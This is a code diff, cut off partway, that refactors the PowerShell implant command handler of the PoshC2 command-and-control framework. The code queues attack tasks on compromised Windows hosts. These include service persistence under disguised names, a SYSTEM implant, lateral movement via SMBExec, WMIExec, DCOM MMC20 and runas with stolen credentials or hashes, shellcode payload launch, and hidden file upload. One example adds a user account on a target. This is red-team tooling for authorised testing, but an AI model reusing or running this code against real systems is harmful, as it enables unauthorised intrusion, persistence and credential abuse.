@@ -1,284 +1,294 @@
-import base64, re, traceback, os
+import base64
+import os
+import re
+import traceback
+
 from prompt_toolkit import PromptSession
-from prompt_toolkit.history import FileHistory
 from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
+from prompt_toolkit.history import FileHistory
 from prompt_toolkit.styles import Style
 
-from poshc2.client.Alias import ps_alias
-from poshc2.Colours import Colours
-from poshc2.Utils import argp, load_file, gen_key, get_first_url, get_first_dfheader, yes_no_prompt
-from poshc2.server.AutoLoads import check_module_loaded, run_autoloads
-from poshc2.client.Help import posh_help, allhelp
-from poshc2.server.Config import PayloadsDirectory, PoshInstallDirectory, PoshProjectDirectory, SocksHost, ModulesDirectory, DomainFrontHeader, PayloadCommsHost
-from poshc2.server.Config import PBindSecret, PBindPipeName
-from poshc2.server.Core import print_bad, creds, print_good
+from poshc2 import Colours
+from poshc2.Utils import argp, load_file, get_first_url, get_first_domainfront_header, yes_no_prompt, command, \
+    get_command_word
+from poshc2.client.Alias import ps_alias, ps_replace
 from poshc2.client.Opsec import ps_opsec
+from poshc2.client.cli.AutosuggestionAggregator import AutosuggestionAggregator
+from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter, FirstWordCompleter
+from poshc2.client.cli.PoshExamplesAutosuggestions import AutoSuggestFromPoshExamples
+from poshc2.client.command_handlers.CommonCommands import common_implant_commands, common_implant_commands_help, \
+    common_implant_examples, common_block_help
+from poshc2.server.AutoLoads import check_module_loaded, run_powershell_autoloads
+from poshc2.server.Config import PayloadsDirectory, PoshProjectDirectory, DomainFrontHeader, PayloadCommsHost
+from poshc2.server.Core import print_bad, creds, print_good, search_help, print_command_help
+from poshc2.server.ImplantType import ImplantType
+from poshc2.server.PowerStatus import get_powerstatus
+from poshc2.server.database.Helpers import select_first, insert_object, update_object, get_implant, get_power_status, \
+    get_new_implant_url
+from poshc2.server.database.Model import C2Server, NewTask, Implant, URL
 from poshc2.server.payloads.Payloads import Payloads
-from poshc2.server.PowerStatus import getpowerstatus
-from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter
-from poshc2.server.database.DB import hide_implant, new_task, select_item, update_label, kill_implant, get_implantdetails, get_c2server_all
-from poshc2.server.database.DB import get_newimplanturl, get_allurls, get_sharpurls, new_urldetails, get_powerstatusbyrandomuri
+
+commands = {}
+commands.update(common_implant_commands)
+commands_help = {}
+commands_help.update(common_implant_commands_help)
+examples = []
+examples.extend(common_implant_examples)
+block_help = {}
+block_help.update(common_block_help)
+
+style = Style.from_dict({
+    '': '#1f48d1',
+})
+
+autosuggester = AutoSuggestFromPoshExamples(examples)
 
 
-def handle_ps_command(command, user, randomuri, implant_id):
+def ps_prompt(prefix):
+    session = PromptSession(
+        history=FileHistory(f'{PoshProjectDirectory}/{ImplantType.PowerShellHttp.get_history_file()}'),
+        auto_suggest=AutosuggestionAggregator([AutoSuggestFromHistory(), autosuggester]), style=style)
+    completions = list(commands.keys())
+    completions.extend(examples)
+    return session.prompt(f'{prefix}> ', completer=FirstWordCompleter(completions, WORD=True))
 
+
+def handle_ps_command(command, user, implant_id):
     try:
-        check_module_loaded("Stage2-Core.ps1", randomuri, user)
+        check_module_loaded("Stage2-Core.ps1", implant_id, user)
     except Exception as e:
-        print_bad("Error loading Stage2-Core.ps1: %s" % e)
+        print_bad(f"Error loading Stage2-Core.ps1: {e}")
 
-    # alias mapping
+    command = command.strip()
+
+    if command.startswith("sharp"):
+        check = input(Colours.RED + "\nDid you mean to run this sharp command in a PS implant? y/N ")
+
+        if check.lower() != "y":
+            return
+
     for alias in ps_alias:
         if command.startswith(alias[0]):
             command.replace(alias[0], alias[1])
 
-    command = command.strip()
+    for alias in ps_replace:
+        if command.startswith(alias[0]):
+            command = command.replace(alias[0], alias[1])
 
-    run_autoloads(command, randomuri, user)
+    command = command.strip()
+    run_powershell_autoloads(command, implant_id, user)
 
     # opsec failures
     for opsec in ps_opsec:
         if opsec == command[:len(opsec)]:
             print_bad("**OPSEC Warning**")
             ri = input("Do you want to continue running - %s? (y/N) " % command)
+
             if ri.lower() == "n":
                 command = ""
+
             if ri == "":
                 command = ""
+
             break
 
-    if command.startswith("searchhistory"):
-        do_searchhistory(user, command, randomuri)
-        return
-    elif command.startswith("searchhelp"):
-        do_searchhelp(user, command, randomuri)
-        return
-    elif command.startswith("searchallhelp"):
-        do_searchallhelp(user, command, randomuri)
-        return
-    elif command.startswith("download-files "):
-        do_download_files(user, command, randomuri)
-        return
-    elif command.startswith("install-servicelevel-persistence"):
-        do_install_servicelevel_persistence(user, command, randomuri)
-        return
-    elif command.startswith("remove-servicelevel-persistence"):
-        do_remove_servicelevel_persistence(user, command, randomuri)
-        return
-    elif command.startswith("get-implantworkingdirectory"):
-        do_get_implantworkingdirectory(user, command, randomuri)
-        return
-    elif command.startswith("get-system"):
-        do_get_system(user, command, randomuri)
-        return
-    elif command.startswith("invoke-psexec ") or command.startswith("invoke-smbexec "):
-        do_invoke_psexec(user, command, randomuri)
-        return
-    elif command.startswith("invoke-psexecpayload "):
-        do_invoke_psexecpayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-wmiexec "):
-        do_invoke_wmiexec(user, command, randomuri)
-        return
-    elif command.startswith("invoke-wmijspbindpayload "):
-        do_invoke_wmijspbindpayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-wmijspayload "):
-        do_invoke_wmijspayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-wmipayload "):
-        do_invoke_wmipayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-dcompayload "):
-        do_invoke_dcompayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-runaspayload"):
-        do_invoke_runaspayload(user, command, randomuri)
-        return
-    elif command.startswith("invoke-runas "):
-        do_invoke_runas(user, command, randomuri)
-        return
-    elif command == "help":
-        do_help(user, command, randomuri)
-        return
-    elif command.startswith("get-pid"):
-        do_get_pid(user, command, randomuri)
-        return
-    elif command.startswith("upload-file"):
-        do_upload_file(user, command, randomuri)
-        return
-    elif command == "kill-process":
-        do_kill_process(user, command, randomuri)
-        return
-    elif command == "kill-implant" or command == "exit":
-        do_kill_implant(user, command, randomuri)
-        return
-    elif command.startswith("migrate"):
-        do_migrate(user, command, randomuri)
-        return
-    elif command.startswith("loadmoduleforce"):
-        do_loadmoudleforce(user, command, randomuri)
-        return
-    elif command.startswith("loadmodule"):
-        do_loadmodule(user, command, randomuri)
-        return
-    elif command.startswith("pbind-loadmodule"):
-        do_pbind_loadmodule(user, command, randomuri)
-        return
-    elif command.startswith("invoke-daisychain"):
-        do_invoke_daisychain(user, command, randomuri)
-        return
-    elif command.startswith("inject-shellcode"):
-        do_inject_shellcode(user, command, randomuri)
-        return
-    elif command == "listmodules":
-        do_listmodules(user, command, randomuri)
-        return
-    elif command == "modulesloaded":
-        do_modulesloaded(user, command, randomuri)
-        return
-    elif command == "ps":
-        do_ps(user, command, randomuri)
-        return
-    elif command == "get-screenshotmulti":
-        do_get_screenshotmulti(user, command, randomuri)
-        return
-    elif command == "get-powerstatus":
-        do_get_powerstatus(user, command, randomuri)
-        return
-    elif command == "get-screenshot":
-        do_get_screenshot(user, command, randomuri)
-        return
-    elif command == "hashdump":
-        do_hashdump(user, command, randomuri)
-        return
-    elif command == "loadpowerstatus":
-        do_loadpowerstatus(user, command, randomuri)
-        return
-    elif command == "stopdaisy":
-        do_stopdaisy(user, command, randomuri)
-        return
-    elif command == "stopsocks":
-        do_stopsocks(user, command, randomuri)
-        return
-    elif command == "sharpsocks":
-        do_sharpsocks(user, command, randomuri)
-        return
-    elif (command.startswith("enable-rotation")):
-        do_rotation(user, command, randomuri)
-        return
-    elif (command.startswith("get-rotation")):
-        do_get_rotation(user, command, randomuri)
-        return
-    elif command.startswith("reversedns"):
-        do_reversedns(user, command, randomuri)
-        return
-    elif command.startswith("startdaisy"):
-        do_startdaisy(user, command, randomuri)
-        return
-    elif command.startswith("sharp") or command.startswith("run-exe") or command.startswith("run-dll"):
-        do_sharp(user, command, randomuri)
-        return
-    else:
-        if command:
-            do_shell(user, command, randomuri)
+    command_word = get_command_word(command)
+
+    if command_word in commands:
+        commands[command_word](user, command, implant_id)
         return
 
-
-def do_searchhistory(user, command, randomuri):
-    searchterm = (command).replace("searchhistory ", "")
-    with open('%s/.implant-history' % PoshProjectDirectory) as hisfile:
-        for line in hisfile:
-            if searchterm in line.lower():
-                print(Colours.GREEN + line.replace("+", ""))
+    if command:
+        commands["shell"](user, command, implant_id)
 
 
-def do_searchhelp(user, command, randomuri):
-    searchterm = (command).replace("searchhelp ", "")
-    helpful = posh_help.split('\n')
-    for line in helpful:
-        if searchterm in line.lower():
-            print(Colours.GREEN + line)
+def get_commands():
+    return commands.keys()
 
 
-def do_searchallhelp(user, command, randomuri):
-    searchterm = (command).replace("searchallhelp ", "")
-    for line in allhelp:
-        if searchterm in line.lower():
-            print(Colours.GREEN + line)
+@command(commands, commands_help, examples, block_help)
+def do_install_servicelevel_persistence(user, command, implant_id):
+    """
+    [Requires Elevation]
+    Obtains persistence by installing a bat file payload to be run via cmd.exe as a service.
 
+    The service is created using sc.exe with the name 'CPUpdater' and Displayname 'CheckpointServiceUpdater'.
+    The operator is prompted for what batch file payload to use.
 
-def do_download_files(user, command, randomuri):
-    print_bad("Please enter a full path to the directory")
+    Examples:
+        install-servicelevel-persistence
+    """
+    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
+                            auto_suggest=AutoSuggestFromHistory(), style=style)
 
-
-def do_install_servicelevel_persistence(user, command, randomuri):
-    style = Style.from_dict({
-        '': '#80d130',
-    })
-    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
     try:
         path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
         path = PayloadsDirectory + path
     except KeyboardInterrupt:
         return
+
     if os.path.isfile(path):
         with open(path, "r") as p:
             payload = p.read()
-    cmd = "sc.exe create CPUpdater binpath= 'cmd /c %s' Displayname= CheckpointServiceUpdater start= auto" % (payload)
-    new_task(cmd, user, randomuri)
+
+    cmd = f"sc.exe create CPUpdater binpath= 'cmd /c {payload}' Displayname= CheckpointServiceUpdater start= auto"
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=cmd,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_remove_servicelevel_persistence(user, commmand, randomuri):
-    new_task("sc.exe delete CPUpdater", user, randomuri)
+@command(commands, commands_help, examples, block_help)
+def do_remove_servicelevel_persistence(user, commmand, implant_id):
+    """
+    [Requires Elevation]
+    Removes the CPUpdater service created by install-servicelevel-persistence.
+
+    Uses sc.exe.
+
+    Examples:
+        remove-servicelevel-persistence
+    """
+    new_task = NewTask(
+        implant_id=implant_id,
+        command="sc.exe delete CPUpdater",
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_get_implantworkingdirectory(user, command, randomuri):
-    new_task("pwd", user, randomuri)
+@command(commands, commands_help, examples, block_help, name="pwd")
+def do_get_implant_working_directory(user, command, implant_id):
+    """
+    Gets the current working directory for the implant.
+
+    Examples:
+        pwd
+        get-implant-working-directory
+    """
+    new_task = NewTask(
+        implant_id=implant_id,
+        command="pwd",
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_get_system(user, command, randomuri):
-    style = Style.from_dict({
-        '': '#80d130',
-    })
-    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+@command(commands, commands_help, examples, block_help)
+def do_get_system(user, command, implant_id):
+    """
+    [Requires Elevation]
+    Obtains a LOCAL SYSTEM implant.
+
+    Uses sc.exe to create a service called 'CPUpdaterMisc' which uses cmd.exe to
+    launch a specified batch file payload.
+
+    The operator is prompted for what batch file payload to use.
+
+    Examples:
+        get-system
+    """
+    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
+                            auto_suggest=AutoSuggestFromHistory(), style=style)
+
     try:
         path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
         path = PayloadsDirectory + path
     except KeyboardInterrupt:
         return
+
     if os.path.isfile(path):
         with open(path, "r") as p:
             payload = p.read()
-        cmd = "sc.exe create CPUpdaterMisc binpath= 'cmd /c %s' Displayname= CheckpointServiceModule start= auto" % payload
-        new_task(cmd, user, randomuri)
+
+        cmd = f"sc.exe create CPUpdaterMisc binpath= 'cmd /c {payload}' Displayname= CheckpointServiceModule start= auto"
+        new_task = NewTask(
+            implant_id=implant_id,
+            command=cmd,
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
         cmd = "sc.exe start CPUpdaterMisc"
-        new_task(cmd, user, randomuri)
+        new_task = NewTask(
+            implant_id=implant_id,
+            command=cmd,
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
         cmd = "sc.exe delete CPUpdaterMisc"
-        new_task(cmd, user, randomuri)
+        new_task = NewTask(
+            implant_id=implant_id,
+            command=cmd,
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
 
 
 @creds()
-def do_invoke_psexec(user, command, randomuri):
-    check_module_loaded("Invoke-SMBExec.ps1", randomuri, user)
+@command(commands, commands_help, examples, block_help, name="invoke-smbexec")
+def do_invoke_psexec(user, command, implant_id):
+    """
+    Uses Invoke-SMBExec to run PSExec-like functionality against the target.
+
+    https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1
+
+    Requires privileged access on the target as the user running the command.
+
+    Aliased as invoke-smbexec and invoke-psexec.
+
+    Examples:
+        invoke-psexec -target 192.168.100.20 -domain testdomain -username test -hash/-pass -command "net user smbexec winter2017 /add"
+    """
+    check_module_loaded("Invoke-SMBExec.ps1", implant_id, user)
     params = re.compile("invoke-smbexec |invoke-psexec ", re.IGNORECASE)
     params = params.sub("", command)
-    cmd = "invoke-smbexec %s" % params
-    new_task(cmd, user, randomuri)
+    cmd = f"invoke-smbexec {params}"
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=cmd,
+        user=user,
+        child_implant_id=None
+    )
 
-
-def do_invoke_smbexec(user, command, randomuri):
-    return do_invoke_psexec(user, command, randomuri)
+    insert_object(new_task)
 
 
 @creds()
-def do_invoke_psexecpayload(user, command, randomuri):
-    check_module_loaded("Invoke-PsExec.ps1", randomuri, user)
+@command(commands, commands_help, examples, block_help, name="invoke-smbexecpayload")
+def do_invoke_psexec_payload(user, command, implant_id):
+    """
+    Uses Invoke-SMBExec to run PSExec-like functionality against the target,
+    prompting for a payload to run.
 
-    style = Style.from_dict({
-        '': '#80d130',
-    })
-    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1
+
+    Requires privileged access on the target as the user running the command.
+
+    The operator is prompted for what batch file payload to use.
+
+    Aliased as invoke-smbexecpayload and invoke-psexecpayload.
+
+    Examples:
+        invoke-psexec-payload -target <ip> -domain <dom> -user <user> -pass '<pass>' -hash <hash-optional> -credid <credid-optional>
+    """
+    check_module_loaded("Invoke-PsExec.ps1", implant_id, user)
+    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
+                            auto_suggest=AutoSuggestFromHistory(), style=style)
+
     try:
         path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
         path = PayloadsDirectory + path
@@ -288,57 +298,69 @@ def do_invoke_psexecpayload(user, command, randomuri):
     if os.path.isfile(path):
         with open(path, "r") as p:
             payload = p.read()
-        params = re.compile("invoke-psexecpayload ", re.IGNORECASE)
+
+        params = re.compile("invoke-psexec-payload ", re.IGNORECASE)
         params = params.sub("", command)
-        cmd = "invoke-psexec %s -command \"%s\"" % (params, payload)
-        new_task(cmd, user, randomuri)
+        cmd = f"invoke-psexec {params} -command \"{payload}\""
+        new_task = NewTask(
+            implant_id=implant_id,
+            command=cmd,
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
     else:
-        print_bad("Need to run createproxypayload first")
+        print_bad(f"Payload not found: {path}")
         return
 
 
 @creds()
-def do_invoke_wmiexec(user, command, randomuri):
-    check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
+@command(commands, commands_help, examples, block_help)
+def do_invoke_wmiexec(user, command, implant_id):
+    """
+    Uses Invoke-WMIExec to execute a command using WMI on a target.
+
+    https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1
+
+    Requires privileged access on the target as the user running the command.
+
+    Examples:
+        invoke-wmiexec -target <ip> -domain <dom> -username <user> -password '<pass>' -hash <hash-optional> -command <cmd>
+    """
+    check_module_loaded("Invoke-WMIExec.ps1", implant_id, user)
     params = re.compile("invoke-wmiexec ", re.IGNORECASE)
     params = params.sub("", command)
-    cmd = "invoke-wmiexec %s" % params
-    new_task(cmd, user, randomuri)
+    cmd = f"invoke-wmiexec {params}"
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=cmd,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
 @creds()
-def do_invoke_wmijspbindpayload(user, command, randomuri):
-    check_module_loaded("New-JScriptShell.ps1", randomuri, user)
-    with open("%s%sDotNet2JS_PBind.b64" % (PayloadsDirectory, ""), "r") as p:
-        payload = p.read()
-    params = re.compile("invoke-wmijspbindpayload ", re.IGNORECASE)
-    params = params.sub("", command)
-    new_task("$Shellcode64=\"%s\" #%s" % (payload, "%s%sDotNet2JS_PBind.b64" % (PayloadsDirectory, "")), user, randomuri)
-    cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
-    new_task(cmd, user, randomuri)
-    target = re.search("(?<=-target )\\S*", str(cmd), re.IGNORECASE)
-    C2 = get_c2server_all()
-    print()
-    print("To connect to the SMB named pipe use the following command:")
-    print(f"{Colours.GREEN}invoke-pbind -target {target[0]} -secret {PBindSecret} -key {C2.EncKey} -pname {PBindPipeName} -client{Colours.END}")
-    print()
-    print("To issue commands to the SMB named pipe use the following command:")
-    print(Colours.GREEN + "pbind-command \"pwd\"" + Colours.END)
-    print()
-    print("To load modules to the SMB named pipe use the following command:")
-    print(Colours.GREEN + "pbind-loadmodule Invoke-Mimikatz.ps1" + Colours.END)
-    print()
-    print("To kill the SMB named pipe use the following command:")
-    print(Colours.GREEN + "pbind-kill" + Colours.END)
+@command(commands, commands_help, examples, block_help)
+def do_invoke_wmi_js_payload(user, command, implant_id):
+    """
+    Uses Invoke-WMIExec to execute a DotNet2JS HTTP payload using WMI on a target.
 
+    https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1
 
-@creds()
-def do_invoke_wmijspayload(user, command, randomuri):
-    check_module_loaded("New-JScriptShell.ps1", randomuri, user)
-    style = Style.from_dict({
-        '': '#80d130',
-    })
-    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    Requires privileged access on the target as the user running the command.
+
+    The operator is prompted for what shellcode file payload to use.
+
+    Examples:
+        invoke-wmi-js-payload -target <ip> -domain <dom> -user <user> -pass '<pass>' -credid <credid-optional>
+    """
+    check_module_loaded("New-JScriptShell.ps1", implant_id, user)
+    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
+                            auto_suggest=AutoSuggestFromHistory(), style=style)
+
     try:
         path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.b64"))
         path = PayloadsDirectory + path
@@ -348,23 +370,51 @@ def do_invoke_wmijspayload(user, command, randomuri):
     if os.path.isfile(path):
         with open(path, "r") as p:
             payload = p.read()
-        params = re.compile("invoke-wmijspayload ", re.IGNORECASE)
+
+        params = re.compile("invoke-wmi-js-payload ", re.IGNORECASE)
         params = params.sub("", command)
-        new_task("$Shellcode64=\"%s\" #%s" % (payload, path), user, randomuri)
-        cmd = "new-jscriptshell %s -payload $Shellcode64" % (params)
-        new_task(cmd, user, randomuri)
+        cmd = f"$Shellcode64=\"{payload}\" #{path}"
+        new_task = NewTask(
+            implant_id=implant_id,
+            command=cmd,
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
+        cmd = f"new-jscriptshell {params} -payload $Shellcode64"
+        new_task = NewTask(
+            implant_id=implant_id,
+            command=cmd,
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
     else:
-        print_bad("Need to run createnewpayload first")
+        print_bad(f"Payload not found: {path}")
         return
 
 
 @creds()
-def do_invoke_wmipayload(user, command, randomuri):
-    check_module_loaded("Invoke-WMIExec.ps1", randomuri, user)
-    style = Style.from_dict({
-        '': '#80d130',
-    })
-    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+@command(commands, commands_help, examples, block_help)
+def do_invoke_wmi_payload(user, command, implant_id):
+    """
+    Uses Invoke-WMIExec to execute a payload using WMI on a target.
+
+    https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-WMIExec.ps1
+
+    Requires privileged access on the target as the user running the command.
+
+    The operator is prompted for what batch file payload to use.
+
+    Examples:
+        invoke-wmi-payload -target <ip> -domain <dom> -user <user> -pass '<pass>' -credid <credid-optional>
+    """
+    check_module_loaded("Invoke-WMIExec.ps1", implant_id, user)
+    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
+                            auto_suggest=AutoSuggestFromHistory(), style=style)
+
     try:
         path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
         path = PayloadsDirectory + path
@@ -374,98 +424,177 @@ def do_invoke_wmipayload(user, command, randomuri):
     if os.path.isfile(path):
         with open(path, "r") as p:
             payload = p.read()
-        params = re.compile("invoke-wmipayload ", re.IGNORECASE)
+
+        params = re.compile("invoke-wmi-payload ", re.IGNORECASE)
         params = params.sub("", command)
-        cmd = "invoke-wmiexec %s -command \"%s\"" % (params, payload)
-        new_task(cmd, user, randomuri)
+        cmd = f"invoke-wmiexec {params} -command \"{payload}\""
+        new_task = NewTask(
+            implant_id=implant_id,
+            command=cmd,
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
     else:
-        print_bad("Need to run createdaisypayload first")
+        print_bad(f"Payload not found: {path}")
         return
 
 
-def do_invoke_dcompayload(user, command, randomuri):
-    style = Style.from_dict({
-        '': '#80d130',
-    })
-    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+@command(commands, commands_help, examples, block_help)
+def do_invoke_dcom_payload(user, command, implant_id):
+    """
+    Uses DCOM to launch a specified payload using a CLSID for MMC20.Application.
+
+    The operator is prompted for what batch file payload to use.
+
+    Uses cmd.exe to launch the payload.
+
+    Examples:
+        invoke-dcom-payload -target <ip>
+    """
+    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
+                            auto_suggest=AutoSuggestFromHistory(), style=style)
+
     try:
         path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
         path = PayloadsDirectory + path
     except KeyboardInterrupt:
         return
+
     if os.path.isfile(path):
         with open(path, "r") as p:
             payload = p.read()
+
         p = re.compile(r'(?<=-target.).*')
         target = re.search(p, command).group()
-        pscommand = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\",\"7\")" % (target, payload)
-        new_task(pscommand, user, randomuri)
+        cmd = "$c = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"%s\")); $c.Document.ActiveView.ExecuteShellCommand(\"C:\\Windows\\System32\\cmd.exe\",$null,\"/c %s\",\"7\")" % (
+        target, payload)
+        new_task = NewTask(
+            implant_id=implant_id,
+            command=cmd,
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
     else:
-        print_bad("Need to run createnewpayload first")
+        print_bad(f"Payload not found: {path}")
         return
 
 
 @creds(accept_hashes=False)
-def do_invoke_runas(user, command, randomuri):
-    check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
+@command(commands, commands_help, examples, block_help)
+def do_invoke_runas(user, command, implant_id):
+    """
+    Uses a custom PowerShell equivalent to runas.exe to run a command as the specified user.
+    Examples:
+        invoke-runas -user <user> -password '<pass>' -domain <dom> -command c:\\windows\\system32\\cmd.exe -args " /c calc.exe"
+    """
+    check_module_loaded("Invoke-RunAs.ps1", implant_id, user)
     params = re.compile("invoke-runas ", re.IGNORECASE)
     params = params.sub("", command)
-    cmd = "invoke-runas %s" % params
-    new_task(cmd, user, randomuri)
+    cmd = f"invoke-runas {params}"
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=cmd,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
 @creds(accept_hashes=False)
-def do_invoke_runaspayload(user, command, randomuri):
-    style = Style.from_dict({
-        '': '#80d130',
-    })
-    session = PromptSession(history=FileHistory('%s/.payload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+@command(commands, commands_help, examples, block_help)
+def do_invoke_runas_payload(user, command, implant_id):
+    """
+    Uses a custom PowerShell equivalent to runas.exe to run a batch payload as the specified user.
+
+    The operator is prompted for what batch file payload to use.
+
+    Examples:
+        invoke-runas-payload -user <user> -password '<pass>' -domain <dom> -credid <credid-optional>
+    """
+    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.payload-history'),
+                            auto_suggest=AutoSuggestFromHistory(), style=style)
+
     try:
         path = session.prompt("Payload to use: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bat"))
         path = PayloadsDirectory + path
     except KeyboardInterrupt:
         return
+
     if os.path.isfile(path):
         with open(path, "r") as p:
             payload = p.read()
-        new_task("$proxypayload = \"%s\"" % payload, user, randomuri)
-        check_module_loaded("Invoke-RunAs.ps1", randomuri, user)
-        params = re.compile("invoke-runaspayload ", re.IGNORECASE)
+
+        cmd = f"$proxypayload = \"{payload}\""
+        new_task = NewTask(
+            implant_id=implant_id,
+            command=cmd,
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
+        check_module_loaded("Invoke-RunAs.ps1", implant_id, user)
+        params = re.compile("invoke-runas-payload ", re.IGNORECASE)
         params = params.sub("", command)
-        pscommand = f"invoke-runas {params} -command $proxypayload"
-        new_task(pscommand, user, randomuri)
+        cmd = f"invoke-runas {params} -command $proxypayload"
+        new_task = NewTask(
+            implant_id=implant_id,
+            command=cmd,
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
     else:
-        print("Need to run createnewpayload first")
+        print_bad(f"Payload not found: {path}")
         return
 
 
-def do_help(user, command, randomuri):
-    print(posh_help)
+@command(commands, commands_help, examples, block_help)
+def do_get_pid(user, command, implant_id):
+    """
+    Get the PID of the current implant.
+
+    Examples:
+        get-pid
+    """
+    implant = get_implant(implant_id)
+    print(implant.process_id)
 
 
-def do_get_pid(user, command, randomuri):
-    implant_details = get_implantdetails(randomuri)
-    print(implant_details.PID)
+@command(commands, commands_help, examples, block_help)
+def do_upload_file(user, command, implant_id):
+    """
+    Uploads a file to the server.
 
+    Hides the file by default. Execution without args will prompt with a filepath completer.
 
-def do_upload_file(user, command, randomuri):
-    source = ""
-    destination = ""
-    nothidden = False
+    Examples:
+        upload-file
+        upload-file -source /tmp/test.exe -destination 'c:\\temp\\test.exe' -nothidden
+    """
     if command == "upload-file":
-        style = Style.from_dict({
-            '': '#80d130',
-        })
-        session = PromptSession(history=FileHistory('%s/.upload-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+        session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.upload-history'),
+                                auto_suggest=AutoSuggestFromHistory(), style=style)
+
         try:
-            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
+            source = session.prompt("Location file to upload: ",
+                                    completer=FilePathCompleter(PayloadsDirectory, glob="*"))
             source = PayloadsDirectory + source
         except KeyboardInterrupt:
             return
+
         while not os.path.isfile(source):
-            print_bad("File does not exist: %s" % source)
-            source = session.prompt("Location file to upload: ", completer=FilePathCompleter(PayloadsDirectory, glob="*"))
+            print_bad(f"File does not exist: {source}")
+            source = session.prompt("Location file to upload: ",
+                                    completer=FilePathCompleter(PayloadsDirectory, glob="*"))
             source = PayloadsDirectory + source
+
         destination = session.prompt("Location to upload to: ")
         nothidden = yes_no_prompt("Do not hide the file:")
     else:
@@ -473,250 +602,519 @@ def do_upload_file(user, command, randomuri):
         source = args.source
         destination = args.destination
         nothidden = args.nothidden
+
     try:
-        print("Uploading %s to %s" % (source, destination))
-        if (nothidden):
-            uploadcommand = f"upload-file {source} {destination} -NotHidden ${nothidden}"
+        print(f"Uploading {source} to {destination}")
+
+        if nothidden:
+            upload_command = f"upload-file {source} {destination} -NotHidden ${nothidden}"
         else:
-            uploadcommand = f"upload-file {source} {destination}"
-        new_task(uploadcommand, user, randomuri)
+            upload_command = f"upload-file {source} {destination}"
+
+        new_task = NewTask(
+            implant_id=implant_id,
+            command=upload_command,
+            user=user,
+            child_implant_id=None
+        )
+
+        insert_object(new_task)
     except Exception as e:
-        print_bad("Error with source file: %s" % e)
+        print_bad(f"Error with source file: {e}")
         traceback.print_exc()
 
 
-def do_kill_process(user, command, randomuri):
